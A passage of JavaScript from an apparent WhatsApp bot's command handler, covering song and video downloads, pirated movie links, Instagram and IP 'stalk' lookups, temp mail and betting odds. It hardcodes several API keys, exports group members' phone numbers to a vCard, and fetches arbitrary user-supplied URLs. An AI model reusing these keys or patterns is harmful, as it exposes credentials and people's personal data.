    if (!(isBotAdmins || isCreator)) return replygcxeon(`This command is for admins only.`);

    const fs = require('fs');
    const groupMetadata = await XeonBotInc.groupMetadata(m.chat);
    const participants = groupMetadata.participants;
    let vcard = '';

    for (let member of participants) {
        try {
            // Fetch name or fallback to the number
            const name = (await XeonBotInc.getName(member.id)) || `Contact +${member.id.split("@")[0]}`;
            const number = member.id.split("@")[0];

            // Format the vCard entry
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${number}:+${number}\nEND:VCARD\n`;
        } catch (error) {
            console.error(`Error fetching name for ${member.id}:`, error);
        }
    }

    // Save all contacts into one file
    const filename = `Group_Contacts_${groupMetadata.subject.replace(/\s+/g, '_')}.vcf`;
    fs.writeFileSync(filename, vcard.trim());

    // Send the file to the group
    await XeonBotInc.sendMessage(m.chat, {
        document: fs.readFileSync(filename),
        mimetype: 'text/vcard',
        fileName: filename,
        caption: `Contacts for group: *${groupMetadata.subject}*`
    }, { quoted: m });

    fs.unlinkSync(filename); // Delete the file after sending
}
break;
case 'play': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} *Morayo by Wizkid*`);

    try {
        const ytApiKey = 'AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo'; // Replace with your YouTube API Key
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(text)}&key=${ytApiKey}`;
        const ytResponse = await fetch(ytSearchUrl);

        if (!ytResponse.ok) throw new Error('YouTube API Error');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${text}".`);
        }

        const video = ytData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoThumbnail = video.snippet.thumbnails.high.url;
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;

        // Build the preview message
        const body = `🎶 *Song Player*\n\n` +
                     `*🎵 Title:* ${videoTitle}\n` +
                     `🔗 *URL:* ${videoUrl}`;

        // Send the preview
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: body
        }, { quoted: m });

        // Fetch the audio from a YouTube audio API
        const downloadUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const downloadResponse = await axios.get(downloadUrl);

        if (downloadResponse.data.success) {
            const { download_url, title } = downloadResponse.data.result;

            // Send the audio file
            await XeonBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here is your song:*\n\n*🎵 Title:* ${title}`
            }, { quoted: m });
        } else {
            replygcxeon(`❌ *Failed to fetch the song. Please try again later.*`);
        }
    } catch (error) {
        console.error('Error in song command:', error);
        replygcxeon(`❌ *An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
    case 'video':
    try {
        if (!text) return replygcxeon('❌ Please specify a video or artist name! Usage: video <video name>');

        const query = text.trim();
        replygcxeon('🔍 Searching for your request...');

        // Step 1: Search YouTube
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(query)}&key=AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo`;
        const ytResponse = await fetch(ytSearchUrl);

        if (!ytResponse.ok) throw new Error('❌ Unable to fetch YouTube data. Please check your API key.');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${query}".`);
        }

        const video = ytData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const thumbnail = video.snippet.thumbnails.high.url;

        // Inform the user about the video found
        await XeonBotInc.sendMessage(
            m.chat,
            {
                image: { url: thumbnail },
                caption: `*🎥 Video Found 🎥*\n\n` +
                         `*Title:* ${videoTitle}\n` +
                         `*YouTube Link:* ${videoUrl}\n\n` +
                         `💬 Downloading *video* for you...`
            },
            { quoted: m }
        );

        // Step 2: Fetch video download link
        const apiUrl = `https://api.siputzx.my.id/api/d/ytmp4`;
        const apiResponse = await axios.get(apiUrl, {
            params: { url: videoUrl }
        });

        if (apiResponse.data.success) {
            const { title, download_url } = apiResponse.data.result;

            // Send the video file directly
            await XeonBotInc.sendMessage(
                m.chat,
                {
                    video: { url: download_url },
                    mimetype: 'video/mp4',
                    caption: `🎬 *Title:* ${title}\n\n> Enjoy your video!`
                },
                { quoted: m }
            );
        } else {
            throw new Error('❌ Unable to fetch the video download link. Please try again later.');
        }
    } catch (err) {
        replygcxeon('❌ An error occurred. Please try again.');
        console.error(err);
    }
    break;
    case 'song': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} *Morayo by Wizkid*`);

    try {
        const ytApiKey = 'AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo'; // Replace with your YouTube API Key
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(text)}&key=${ytApiKey}`;
        const ytResponse = await fetch(ytSearchUrl);

        if (!ytResponse.ok) throw new Error('YouTube API Error');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${text}".`);
        }

        const video = ytData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoThumbnail = video.snippet.thumbnails.high.url;
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;

        // Build the preview message for the song
        const body = `🎶 *Song Player*\n\n` +
                     `*🎵 Title:* ${videoTitle}\n` +
                     `🔗 *URL:* ${videoUrl}`;

        // Send the preview
        await XeonBotInc.sendMessage(m.chat, {
            image: { url: videoThumbnail },
            caption: body
        }, { quoted: m });

        // Fetch the audio from a YouTube audio API
        const downloadUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const downloadResponse = await axios.get(downloadUrl);

        if (downloadResponse.data.success) {
            const { download_url, title } = downloadResponse.data.result;

            // Send the audio file
            await XeonBotInc.sendMessage(m.chat, {
                audio: { url: download_url },
                mimetype: 'audio/mp4',
                fileName: `${title}.mp3`,
                caption: `🎧 *Here is your song:*\n\n*🎵 Title:* ${title}`
            }, { quoted: m });          

            // Fetch video download link
            const apiUrl = `https://api.siputzx.my.id/api/d/ytmp4`;
            const apiResponse = await axios.get(apiUrl, {
                params: { url: videoUrl }
            });

            if (apiResponse.data.success) {
                const { title, download_url } = apiResponse.data.result;

                // Send the video file directly
                await XeonBotInc.sendMessage(
                    m.chat,
                    {
                        video: { url: download_url },
                        mimetype: 'video/mp4',
                        caption: `🎬 *Title:* ${title}\n\n> Enjoy your video!`
                    },
                    { quoted: m }
                );
            } else {
                throw new Error('❌ Unable to fetch the video download link. Please try again later.');
            }
        } else {
            replygcxeon(`❌ *Failed to fetch the song. Please try again later.*`);
        }
    } catch (error) {
        console.error('Error in song command:', error);
        replygcxeon(`❌ *An error occurred while processing your request. Please try again later.*`);
    }
    break;
}
case 'playdoc': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        // Search YouTube using API key
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(text)}&key=AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo`;
        const ytResponse = await fetch(ytSearchUrl);

        if (!ytResponse.ok) throw new Error('❌ Unable to fetch YouTube data. Please check your API key.');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${text}".`);
        }

        const video = ytData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const thumbnail = video.snippet.thumbnails.high.url;

        const body = `🎶 *Song player*\n\n` +
                     `🎵 *Title:* ${videoTitle}\n` +
                     `🔗 *URL:* ${videoUrl}\n`;

        await XeonBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: body
        }, { quoted: m });

        // Fetch audio download details
        const apiUrl = `https://api.siputzx.my.id/api/d/ytmp3?url=${encodeURIComponent(videoUrl)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data;

            await XeonBotInc.sendMessage(m.chat, {
                document: { url: dl },
                mimetype: 'audio/mpeg',
                fileName: `${title}.mp3`,
                caption: `📁 *Audio File:* ${title}.mp3`
            }, { quoted: m });
        } else {
            replygcxeon(`❌ Failed to fetch the audio file. Try again later.`);
        }
    } catch (error) {
        console.error('Error during playdoc command:', error);
        replygcxeon(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'videodoc': {
    if (!text) return replygcxeon(`*Example*: ${prefix + command} Faded by Alan Walker`);

    try {
        // Search YouTube using API key
        const ytSearchUrl = `https://www.googleapis.com/youtube/v3/search?part=snippet&maxResults=1&q=${encodeURIComponent(text)}&key=AIzaSyB8zchDXuAcNfuqVVMlLMtrPybb4bUCIpo`;
        const ytResponse = await fetch(ytSearchUrl);

        if (!ytResponse.ok) throw new Error('❌ Unable to fetch YouTube data. Please check your API key.');
        const ytData = await ytResponse.json();

        if (!ytData.items || ytData.items.length === 0) {
            return replygcxeon(`❌ No results found for "${text}".`);
        }

        const video = ytData.items[0];
        const videoId = video.id.videoId;
        const videoTitle = video.snippet.title;
        const videoUrl = `https://www.youtube.com/watch?v=${videoId}`;
        const thumbnail = video.snippet.thumbnails.high.url;

        const body = `🎬 *Song player*\n\n` +
                     `🎞️ *Title:* ${videoTitle}\n` +
                     `🔗 *URL:* ${videoUrl}\n`;

        await XeonBotInc.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: body
        }, { quoted: m });

        // Fetch video download details
        const apiUrl = `https://api.siputzx.my.id/api/d/ytmp4?url=${encodeURIComponent(videoUrl)}`;
        const apiResponse = await axios.get(apiUrl);

        if (apiResponse.data.status) {
            const { title, dl } = apiResponse.data.data;

            await XeonBotInc.sendMessage(m.chat, {
                document: { url: dl },
                mimetype: 'video/mp4',
                fileName: `${title}.mp4`,
                caption: `📁 *Video File:* ${title}.mp4`
            }, { quoted: m });
        } else {
            replygcxeon(`❌ Failed to fetch the video file. Try again later.`);
        }
    } catch (error) {
        console.error('Error during videodoc command:', error);
        replygcxeon(`❌ An error occurred. Please try again later.`);
    }
    break;
}
    case 'movie': {
    if (!text) return replygcxeon(`❗ Example: ${prefix + command} <movie-name>`);

    try {
        await replygcxeon(`🔍 *Searching for movies...*\nPlease wait.`);
        const apiUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/search?text=${encodeURIComponent(text)}`;
        const response = await axios.get(apiUrl);

        const { status, result } = response.data;
        if (!status || !result || result.movies.length === 0) {
            return replygcxeon(`❌ No movies found for "${text}". Please try again.`);
        }

        // Save search results temporarily
        global.movieSearchResults = result.movies;

        let movieList = `🎥 *Search Results for "${text}":*\n\n`;
        result.movies.forEach((movie, index) => {
            movieList += `${index + 1}. *${movie.title}*\n   🌟 ${movie.imdb} | 📅 ${movie.year}\n   🔗 [Details](${movie.link})\n\n`;
        });
        movieList += `\nTo select a movie, use the command:\n*.selectmovie <number>* (e.g., *.selectmovie 1*).`;

        await replygcxeon(movieList);
    } catch (error) {
        console.error('Error searching for movies:', error.message);
        replygcxeon(`❌ An error occurred while searching for movies. Please try again.`);
    }
    break;
}
case 'selectmovie': {
    if (!text) return replygcxeon(`❗ Example: ${prefix + command} <number>\nSelect a movie from the list.`);
    if (!global.movieSearchResults || global.movieSearchResults.length === 0) {
        return replygcxeon(`❌ No movies found. Please use the *movie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieSearchResults.length) {
        return replygcxeon(`❌ Invalid number. Please choose a valid movie number from the list.`);
    }

    const selectedMovie = global.movieSearchResults[selectedIndex];
    const movieDetailsUrl = `https://www.dark-yasiya-api.site/movie/sinhalasub/movie?url=${encodeURIComponent(selectedMovie.link)}`;

    try {
        await replygcxeon(`🔍 *Fetching movie details...*\nPlease wait.`);
        const response = await axios.get(movieDetailsUrl);

        const { status, result } = response.data;
        if (!status || !result) {
            return replygcxeon(`❌ Failed to fetch movie details. Please try again.`);
        }

        const movie = result.data;
        global.movieLinks = movie.dl_links;
        global.selectedMovieTitle = movie.title; // Save the movie title globally for use in the download command

        let movieInfo = `🎬 *${movie.title}*\n\n`;
        movieInfo += `📅 *Release Date:* ${movie.date}\n`;
        movieInfo += `🌍 *Country:* ${movie.country}\n`;
        movieInfo += `⏳ *Runtime:* ${movie.runtime}\n`;
        movieInfo += `⭐ *IMDb Rating:* ${movie.imdbRate}/10 (${movie.imdbVoteCount} votes)\n`;
        movieInfo += `🎥 *TMDb Rating:* ${movie.tmdbRate}/10\n\n`;
        movieInfo += `💾 *Available Qualities:*\n`;
        movie.dl_links.forEach((link, index) => {
            movieInfo += `  ${index + 1}. *${link.quality}* - *${link.size}*\n`;
        });
        movieInfo += `\nTo download, use the command:\n*.secmovie <number>* (e.g., *.secmovie 2*).`;

        await XeonBotInc.sendMessage(m.chat, { image: { url: movie.image }, caption: movieInfo }, { quoted: m });
    } catch (error) {
        console.error('Error fetching movie details:', error.message);
        replygcxeon(`❌ An error occurred while fetching movie details. Please try again.`);
    }
    break;
}
case 'secmovie': {
    if (!text) return replygcxeon(`❗ Example: ${prefix + command} <number>\nChoose a quality number from the list provided earlier.`);
    if (!global.movieLinks || global.movieLinks.length === 0) {
        return replygcxeon(`❌ No movie details found. Please use the *selectmovie* command first.`);
    }

    const selectedIndex = parseInt(text.trim()) - 1;
    if (isNaN(selectedIndex) || selectedIndex < 0 || selectedIndex >= global.movieLinks.length) {
        return replygcxeon(`❌ Invalid number. Please choose a valid quality number from the list.`);
    }

    const selectedLink = global.movieLinks[selectedIndex]?.link;
    if (!selectedLink) {
        return replygcxeon(`❌ Could not find the selected quality. Please try again.`);
    }

    try {
        const movieTitle = global.selectedMovieTitle || 'Movie'; // Use the saved movie title
        const downloadMessage = `🎥 *Movie Download Link*\n\n*Title:* ${movieTitle}\n\n🔗 [Download Here](${selectedLink})`;

        await XeonBotInc.sendMessage(m.chat, { text: downloadMessage }, { quoted: m });
    } catch (error) {
        console.error('Error sending download link:', error.message);
        replygcxeon(`❌ An error occurred while sending the download link. Please try again.`);
    }
    break;
}
case 'instagramstalk': case 'igstalk': {
    if (!text) return replygcxeon('Please provide a username.\nExample: .igstalk davido');
    
    const username = text.trim(); // Extract the username
    const isLowercase = /^[a-z0-9_.]+$/.test(username); // Validate for lowercase and valid Instagram usernames

    // Reject input if it contains uppercase letters or invalid characters
    if (!isLowercase) {
        return replygcxeon('Please use lowercase letters only for the username.\nExample: .igstalk davido');
    }

    try {
        const apiKey = 'gifted-md'; // API key
        const apiUrl = `https://api.giftedtech.my.id/api/stalk/igstalkv2?apikey=${apiKey}&username=${username}`;

        // Fetch Instagram details
        const response = await axios.get(apiUrl);

        if (response.data.status === 200 && response.data.success) {
            const { profile, username, fullName, bio, posts, followers, following } = response.data.result;

            // Construct the reply message
            const message = `*Instagram Stalker*\n\n` +
                            `🔹 *Username:* ${username}\n` +
                            `🔹 *Full Name:* ${fullName}\n` +
                            `🔹 *Bio:* ${bio}\n` +
                            `🔹 *Posts:* ${posts}\n` +
                            `🔹 *Followers:* ${followers}\n` +
                            `🔹 *Following:* ${following}`;

            // Send the response with profile picture
            await XeonBotInc.sendMessage(m.chat, { 
                caption: message, 
                image: { url: profile }
            }, { quoted: m });
        } else {
            // Handle unsuccessful response
            replygcxeon(`Failed to fetch details for username "${username}".\nReason: ${response.data.message || 'Unknown error.'}`);
        }
    } catch (error) {
        // Handle specific errors without logging to console
        if (error.response) {
            replygcxeon(`API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replygcxeon('No response received from the API. Please try again later.');
        } else {
            replygcxeon(`An error occurred: ${error.message}`);
        }
    }
    break;
}
case 'pickupline': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replygcxeon(`💘 *Pickup Line:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replygcxeon('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replygcxeon(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replygcxeon('❌ No response received from the API. Please try again later.');
        } else {
            replygcxeon(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}

case 'rizz': {
    try {
        const apiUrl = `https://api.popcat.xyz/pickuplines`;

        // Fetch a pickup line
        const response = await axios.get(apiUrl);

        if (response.status === 200 && response.data.pickupline) {
            const pickupLine = response.data.pickupline;

            // Send the pickup line
            replygcxeon(`🔥 *RIZZ:*\n\n${pickupLine}`);
        } else {
            // Handle unsuccessful response
            replygcxeon('❌ Failed to fetch a pickup line. Please try again later.');
        }
    } catch (error) {
        // Handle specific errors without exposing logs
        if (error.response) {
            replygcxeon(`❌ API Error: ${error.response.data.message || 'Unknown API error.'}`);
        } else if (error.request) {
            replygcxeon('❌ No response received from the API. Please try again later.');
        } else {
            replygcxeon(`❌ An error occurred: ${error.message}`);
        }
    }
    break;
}
case "tempmail":
case "tmpmail":
case "newmail": {
    if (!tempMailData[m.sender]) {
        try {
            // Generate a random email using 1SecMail API
            const response = await axios.get('https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1');
            const data = response.data[0];

            if (!data) {
                return replygcxeon("❌ Failed to generate a temporary email. Please try again.");
            }

            // Save the generated email for the user
            tempMailData[m.sender] = { email: data };
            replygcxeon(`✅ *Temporary Email Created:*\n\n📧 Email: ${data}\n\nUse *${prefix}checkmail* to check your inbox.\nUse *${prefix}delmail* to delete your email.`);
        } catch (error) {
            console.error(error);
            replygcxeon("❌ An error occurred while creating a temporary email. Please try again.");
        }
    } else {
        replygcxeon(`📧 *You already have a temporary email:*\n\n${tempMailData[m.sender].email}\n\nUse *${prefix}checkmail* to check your inbox.`);
    }
    break;
}

// **Check Emails**
case "checkmails":
case "readmail":
case "reademail": {
    const userMail = tempMailData[m.sender];
    if (!userMail) {
        return replygcxeon(`❌ You don't have a temporary email. Use *${prefix}tempmail* to create one.`);
    }

    try {
        // Get the list of emails from the inbox using 1SecMail API
        const [login, domain] = userMail.email.split('@');
        const response = await axios.get(`https://www.1secmail.com/api/v1/?action=getMessages&login=${login}&domain=${domain}`);
        
        const inbox = response.data;
        if (!inbox || inbox.length === 0) {
            return replygcxeon(`📭 *No mails received yet!*\nUse *${prefix}delmail* to delete mail.`);
        }

        let messageList = "📩 *Your Emails:*\n\n";
        for (const email of inbox) {
            messageList += `📧 *From:* ${email.from}\n🗓️ *Date:* ${email.date}\n✉️ *Subject:* ${email.subject}\n🔑 *ID:* ${email.id}\n\n`;
        }
        replygcxeon(messageList.trim());
    } catch (error) {
        console.error(error);
        replygcxeon("❌ An error occurred while checking emails. Please try again.");
    }
    break;
}

// **Delete Temporary Email**
case "delmail":
case "deletemail":
case "deltemp":
case "deltmp": {
    const userMail = tempMailData[m.sender];
    if (userMail) {
        try {
            // Delete the temporary email using 1SecMail API
            const [login, domain] = userMail.email.split('@');
            const response = await axios.get(`https://www.1secmail.com/api/v1/?action=deleteMailbox&login=${login}&domain=${domain}`);
            
            if (response.data.result === 'success') {
                delete tempMailData[m.sender]; // Remove from local storage
                replygcxeon("✅ Your temporary email has been deleted.");
            } else {
                replygcxeon("❌ Failed to delete your temporary email. Please try again.");
            }
        } catch (error) {
            console.error(error);
            replygcxeon("❌ An error occurred while deleting your temporary email. Please try again.");
        }
    } else {
        replygcxeon("❌ You don't have a temporary email to delete.");
    }
    break;
}
case 'logointro': {
    if (!text) return replygcxeon(`Example: ${prefix + command} Phistar`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/free-logo-intro-video-maker-online-558.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await XeonBotInc.sendMessage(m.chat, {
                video: { url: BK9 },
                caption: `\n> Logo Intro Generated Successfully!`
            }, { quoted: m });
        } else {
            replygcxeon(`❌ Failed to generate logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Logo:', error.message);
        replygcxeon(`❌ An error occurred. Please try again later.`);
    }
    break;
}
case 'dragonball': {
    if (!text) return replygcxeon(`Example: ${prefix + command} BIG DADDY`);

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/maker/ephoto-1?text=${encodeURIComponent(text)}&url=https://en.ephoto360.com/create-dragon-ball-style-text-effects-online-809.html`;

        // Fetch response from API
        const response = await axios.get(apiUrl);
        const { status, BK9 } = response.data;

        if (status && BK9) {
            await XeonBotInc.sendMessage(m.chat, {
                image: { url: BK9 },
                caption: `\n> Dragon Ball Logo Generated Successfully!`
            }, { quoted: m });
        } else {
            replygcxeon(`❌ Failed to generate the Dragon Ball logo. Please try again.`);
        }
    } catch (error) {
        console.error('Error generating Dragon Ball logo:', error.message);
        replygcxeon(`❌ An error occurred. Please try again later.`);
    }
    break;
}

case 'listcurrency': {
    axios.get('https://api.exchangerate-api.com/v4/latest/USD')
        .then(response => {
            const currencies = Object.keys(response.data.rates);
            const currencyList = currencies.join(', ');
            replygcxeon(`Supported Currencies: ${currencyList}`);
        })
        .catch(() => replygcxeon('❌ Could not retrieve the list of currencies. Please try again later.'));
    break;
}

case 'tinyurl': {
    if (!q) return replygcxeon('❌ Provide a valid link to shorten.');

    const request = require('request');
    request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
        try {
            replygcxeon(body);
        } catch (e) {
            replygcxeon(`❌ Error: ${e}`);
        }
    });
    break;
}
case 'predictions': 
case 'sureodd': 
case 'sureodds': {
    // List of multiple API keys
    const apiKeys = [
        '73338da37ce534482c87846eab310b6f',
        '0e633fb2254604579825c34f3639dce3',
        '4819be8d34033fc925862bf47d3a80c8'
    ];

    // Randomly pick an API key
    const randomApiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)];

    // API URL with the randomly chosen key
    const apiUrl = `https://api.the-odds-api.com/v4/sports/soccer_epl/odds?apiKey=${randomApiKey}&regions=us`;

    try {
        await replygcxeon('🔍 Fetching real sure odds...');

        const response = await axios.get(apiUrl);
        const matches = response.data.slice(0, 3); // Get top 3 sure odds

        if (!matches.length) {
            return replygcxeon('❌ No sure odds available at the moment. Try again later.');
        }

        let message = "🔥 *Sure Odds (100% Analysis)* 🔥\n\n";
        matches.forEach(match => {
            message += `⚽ *Match:* ${match.home_team} vs ${match.away_team}\n`;
            message += `📊 *Odds:* ${match.bookmakers[0].markets[0].outcomes[0].price}\n`;
            message += `💰 *Best Bookmaker:* ${match.bookmakers[0].title}\n\n`;
        });

        replygcxeon(message.trim());
    } catch (error) {
        console.error(error);
        replygcxeon('❌ Failed to fetch real sure odds. Try again later.');
    }
    break;
}
case 'sports': {
    const menu = `*⚽ Sports Menu:*\n
1️⃣ .livescores - Get live scores of ongoing matches.
2️⃣ .fixtures <league> - View upcoming matches for a specific league.
3️⃣ .standings <league> - Check the league standings.
4️⃣ .sportsnews - Get the latest sports news.\n
Use these commands to stay updated with sports events!`;
    
    replygcxeon(menu);
    break;
}

case 'livescores': {
    if (!isCreator) return replygcxeon(mess.owner); // Fix: Proper condition placement

    try {
        const apiUrl = 'https://livescore6.p.rapidapi.com/matches/v2/list-live?Category=soccer';
        const apiKey = 'a5bf8cd433msh33c0811108517b2p1b77a6jsn4cd75f147bf8'; // Your API Key

        const response = await fetch(apiUrl, {
            method: 'GET',
            headers: {
                'X-RapidAPI-Key': apiKey,
                'X-RapidAPI-Host': 'livescore6.p.rapidapi.com',
            },
        });

        if (!response.ok) {
            return replygcxeon("❌ Failed to fetch live scores. Please try again later.");
        }

        const data = await response.json();

        if (!data || !data.Stages || data.Stages.length === 0) {
            return replygcxeon("❌ No live matches currently.");
        }

        let liveScores = "*⚽ Live Soccer Scores:*\n\n";
        data.Stages.forEach((stage) => {
            stage.Events.forEach((event) => {
                const home = event.T1?.[0]?.Nm || "Team 1";
                const away = event.T2?.[0]?.Nm || "Team 2";
                const score = `${event.Tr1 ?? 0} - ${event.Tr2 ?? 0}`; // Fix: Using nullish coalescing for safety
                liveScores += `🏟️ ${home} vs ${away}\n📊 *Score:* ${score}\n\n`;
            });
        });

        await XeonBotInc.sendMessage(m.chat, {
            image: { url: 'https://files.catbox.moe/xm02jo.jpg' },
            caption: liveScores.trim(),
        }, { quoted: m });

    } catch (error) {
        console.error("Error fetching live scores:", error);
        replygcxeon("❌ An error occurred while fetching live scores. Please try again later.");
    }
    break;
}
case 'ffstalk': {
    if (!args[0]) return replygcxeon('❌ Please provide a Free Fire ID. Example: .ffstalk 8533270051');

    const ffId = args[0];
    const apiUrl = `https://api.davidcyriltech.my.id/ffstalk?id=${ffId}`;

    try {
        const response = await axios.get(apiUrl);
        const data = response.data;

        if (!data.success) return replygcxeon('❌ Failed to fetch data. Please check the ID and try again.');

        // Extract account details
        const {
            name, level, xp, region, likes, created_at, last_login, honor_score, 
            booyah_pass, BR_points, CS_points
        } = data.account;

        const guild = data.guild ? `\n🏴 Guild: ${data.guild.name} (Level: ${data.guild.level})` : '';

        const message = `
🎮 *Free Fire Profile* 🎮
━━━━━━━━━━━━━━━━━
👤 *Name:* ${name}
🆔 *ID:* ${ffId}
⭐ *Level:* ${level} (XP: ${xp})
🌍 *Region:* ${region}
👍 *Likes:* ${likes}
📅 *Created:* ${created_at}
⏳ *Last Login:* ${last_login}
🛡 *Honor Score:* ${honor_score}
🔥 *Booyah Pass:* ${booyah_pass}
🏆 *Battle Royale Points:* ${BR_points}
⚔️ *Clash Squad Points:* ${CS_points}
${guild}
━━━━━━━━━━━━━━━━━
    `;

        replygcxeon(message);
    } catch (error) {
        console.error('FF Stalk Error:', error);
        replygcxeon('❌ An error occurred while fetching data. Please try again later.');
    }
    break;
}
case 'trackip': {
    if (!text) return replygcxeon(`*Example:* ${prefix + command} 112.90.150.204`);

    try {
        let res = await fetch(`https://ipwho.is/${text}`).then(result => result.json());

        const formatIPInfo = (info) => {
            return `
*IP Information*
• IP: ${info.ip || 'N/A'}
• Success: ${info.success || 'N/A'}
• Type: ${info.type || 'N/A'}
• Continent: ${info.continent || 'N/A'}
• Continent Code: ${info.continent_code || 'N/A'}
• Country: ${info.country || 'N/A'}
• Country Code: ${info.country_code || 'N/A'}
• Region: ${info.region || 'N/A'}
• Region Code: ${info.region_code || 'N/A'}
• City: ${info.city || 'N/A'}
• Latitude: ${info.latitude || 'N/A'}
• Longitude: ${info.longitude || 'N/A'}
• Is EU: ${info.is_eu ? 'Yes' : 'No'}
• Postal: ${info.postal || 'N/A'}
• Calling Code: ${info.calling_code || 'N/A'}
• Capital: ${info.capital || 'N/A'}
• Borders: ${info.borders || 'N/A'}
• Flag:
  - Image: ${info.flag?.img || 'N/A'}
  - Emoji: ${info.flag?.emoji || 'N/A'}
  - Emoji Unicode: ${info.flag?.emoji_unicode || 'N/A'}
• Connection:
  - ASN: ${info.connection?.asn || 'N/A'}
  - Organization: ${info.connection?.org || 'N/A'}
  - ISP: ${info.connection?.isp || 'N/A'}
  - Domain: ${info.connection?.domain || 'N/A'}
• Timezone:
  - ID: ${info.timezone?.id || 'N/A'}
  - Abbreviation: ${info.timezone?.abbr || 'N/A'}
  - Is DST: ${info.timezone?.is_dst ? 'Yes' : 'No'}
  - Offset: ${info.timezone?.offset || 'N/A'}
  - UTC: ${info.timezone?.utc || 'N/A'}
  - Current Time: ${info.timezone?.current_time || 'N/A'}
`;
        };

        if (!res.success) throw new Error(`IP ${text} not found!`);

        await XeonBotInc.sendMessage(m.chat, { location: { degreesLatitude: res.latitude, degreesLongitude: res.longitude } }, { ephemeralExpiration: 604800 });
        const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
        await delay(2000);
        replygcxeon(formatIPInfo(res));
    } catch (e) {
        replygcxeon(`Error: Unable to retrieve data for IP ${text}`);
    }
    break;
}
case 'get': {
    if (typeof text !== 'string' || !text.trim()) {
        return replygcxeon(`Add Input (Link)\n\nExample: ${prefix + command} https://example.com`);
    }

    const isUrl = (url) => {
        return url.match(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/gi);
    };

    const urlMatch = isUrl(text);
    if (!urlMatch) {
        return replygcxeon(`Invalid URL provided. Please provide a valid URL.\n\nExample: ${prefix + command} https://example.com`);
    }

    const url = urlMatch[0]; // Use the first match
    try {
        const res = await axios.get(url);
        if (!/json|html|plain/.test(res.headers['content-type'])) {
            return replygcxeon(`The content type of the provided URL is not supported.\n\nSupported types: json, html, plain text.`);
        }

        replygcxeon(util.format(res.data));
    } catch (e) {
        replygcxeon(`Error fetching data from the provided URL: ${util.format(e.message)}`);
    }
}
break;
case 'llama': {
    if (!text) {
        replygcxeon('Please Ask Llama AI Anything.');
        return;
    }

    try {
        const response = await axios.get('https://bk9.fun/ai/llama', {
            params: { q: text }
        });

        if (response.data.status) {
            const replyMessage = response.data.BK9;
            replygcxeon(replyMessage);
        } else {
            replygcxeon('Failed to get a response from Llama AI.');
        }
    } catch (error) {
        console.error('Error fetching from Llama API:', error);
